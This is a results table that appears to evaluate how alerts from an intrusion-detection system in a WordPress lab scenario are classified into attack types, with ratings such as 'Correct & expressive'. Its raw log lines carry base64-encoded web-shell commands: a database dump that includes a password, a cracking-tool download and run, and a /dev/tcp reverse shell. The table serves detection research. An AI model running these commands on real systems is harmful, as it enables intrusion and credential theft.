AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
Dirb;2;"Information Gathering,
Credential Access,
Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to WordPress themes admin directory;Correct & expressive
Dirb;2;"Information Gathering,
Credential Access, 
Vulnerability Scanning";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd”";Classification probably based on attempted access to WordPress themes admin directory;Correct & expressive
Webshell;1;"Web Shell, 
Command and Control,
Exfiltration, 
Credential Access";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 200 507795 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload and decoded mysql request;Correct & expressive
Webshell;1;"Web Shell, 
Command and Control,
Defense Evasion,
Inhibit Response Function";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1” ";Classification probably based on high entropy because of base64 encoded payload and decoded wget download request from github;Correct & expressive
Password Cracking;1;"Web Shell, 
Credential Access, 
Defense Evasion, 
Inhibit Response Function";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload, however decoded content (keywords: wphashcrack, rockyou) were not used;Too generic
Password Cracking;1;"Reconnaissance, 
Application Layer Protocol Confusion";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”
Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox”";Classification probably based on unusual occurrence frequency of http POST method;Too generic
Password Cracking;1;"Resource Hijacking, 
Impact";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”;Classification probably based on deviation in CPU usage;Too generic
Reverse Shell;1;"Web Shell, 
Command and Control, 
Defense Evasion";"IDS: “High entropy in Apache Access request”, “Value entropy anomaly detected”
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 200 506717 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload and decoded payload containing keywords bash and usage of exec function;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Credential Access";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation, 
Lateral Movement";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Credential Access";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation, 
Authentication Bypass";"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on PAM event and tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Account Manipulation";"IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on PAM event and tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Credential Access";"IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on PAM event and tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Execution";"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=""phopkins"" exe=""/bin/su"" hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on PAM event and tool name su;Correct & expressive
;84;;;;
